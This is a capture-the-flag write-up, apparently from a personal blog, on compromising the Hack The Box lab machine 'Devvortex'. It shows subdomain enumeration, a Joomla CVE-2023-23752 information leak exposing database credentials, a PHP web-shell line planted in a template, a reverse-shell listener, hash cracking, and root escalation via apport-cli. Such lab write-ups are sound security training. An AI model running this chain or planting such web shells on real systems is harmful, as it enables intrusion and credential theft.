---
title: "Devvortex"
tags:
    - machine
    - cms
date: "2024-04-27"
thumbnail: "/assets/img/thumbnail/Devvortex.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Devvortex.png" alt="Devvortex">

# Solution
## Recon
---

Applying nmap scan

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/devvortex]
└─$ nmap -sV -sC -Pn -oA devvortex 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
we see that there's a web service on port 80 and there's a domain devvortex.htb should be submitted in `/etc/hosts` file
when we add the domain to /etc/hosts we can visit the site now
<img src="/assets/img/htb/devvortex/1.png">
After examining the site you won't find any interesting thing so let's do more reconnaisance.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/devvortex]
└─$ gobuster dir -u http://10.10.11.242/ -w ~/Desktop/tools/SecLists/Discovery/Web-Content/raft-small-directories.txt -b 302
```
but I got no useful results, so let's try subdomain enumeration

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/devvortex]
└─$ ffuf -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -w ~/Desktop/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 153ms]
```
## shell as www-data
---
We found a subdomain here which is `dev.devvortex.htb`. let's add it to /etc/hosts file and visit the subdomain.
<img src="/assets/img/htb/devvortex/2.png">
After examining the site you won't find any interesting thing also so let's do more reconnaisance.
I found interesting endpoints in `/robots.txt` endpoint.
<img src="/assets/img/htb/devvortex/3.png">
when you visit `/administrator` endpoint you will find login page powered by joomla cms.
You can find tips for joomla pentesting <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">here</a>.
you will find in the link above that `/administrator/manifests/files/joomla.xml` endpoint let's you know the version of joomla.
<img src="/assets/img/htb/devvortex/4.png">
We see that the version is `v4.2.6` which we can find that it's vulnerable to `CVE-2023-23752`.
You can find many articles about the cve <a href="https://vulncheck.com/blog/joomla-for-rce">here</a> as example and from them i appended `/api/index.php/v1/config/application?public=true` to the url and got this
<img src="/assets/img/htb/devvortex/5.png">
Nice we got credentials `lewis:P4ntherg0t1n5r3c0n##` which will be used to login to joomla dashboard.
continue reading in <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">this</a> and you will find what you should do next.
You should go to system and you will find many templates i choosed `Administrator Templates` and find many files.
I opened `index.php` and added this line `system($_GET['cmd']);` so when i visit this `http://dev.devvortex.htb/administrator/index.php?cmd=whoami` I see `www-data` which is the result of whoami command in the beginning of the site
<img src="/assets/img/htb/devvortex/6.png">
Nice we have RCE let's get a shell.
setting up a listerner at port 4444
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```
and i went to <a href="https://www.revshells.com/">revshells</a> for the reverse shell payload.
You can use many php shells as the payload will be inserted in php code (I used pentest monkey php shell) added it to index.php file in the admin templates and i got the shell as `www-data`

## shell as logan
---
stablize the shell using ```python3 -c "import pty;pty.spawn('/bin/bash)"```
If you remember the article of the CVE we used, The credentials are usually for MYSQL db and when we use the command ```ss -tulpn``` we find that port 3306 is used which is the default for MYSQL.
Let's access MYSQL db
```bash
www-data@devvortex:/$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n## 
```
We accessed the db successfully and after digging into it we found `sd4fg_users` table in joomla database
```bash
mysql> select username,password from sd4fg_users;
select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```
we have two users with two hashed passwords i tried to crack them but only the password of the user logan is cracked successfully.
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/devvortex]
└─$ john hash --show                                            
?:t************

1 password hash cracked, 0 left
```

I used this password in ssh ```ssh logan@10.10.11.242```
and congrats u are logan now
<img src="/assets/img/htb/devvortex/7.png">
```bash
logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ cat user.txt 
1*******************************
```

## shell as root
---

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
We find that there's a command you can execute using sudo
I found that this command is vulnerable to privesc <a href="https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/">here</a>.
Briefly you will walkthrough the choices until you get view report which will be opened in a less page as root so you can execute `!/bin/bash` as root and now you are root.
```bash
root@devvortex:/home/logan# cd /root
root@devvortex:~# cat root.txt 
b*******************************
```
I wish the walkthrough helped you ^^

<img src="/assets/img/htb/devvortex/8.png">
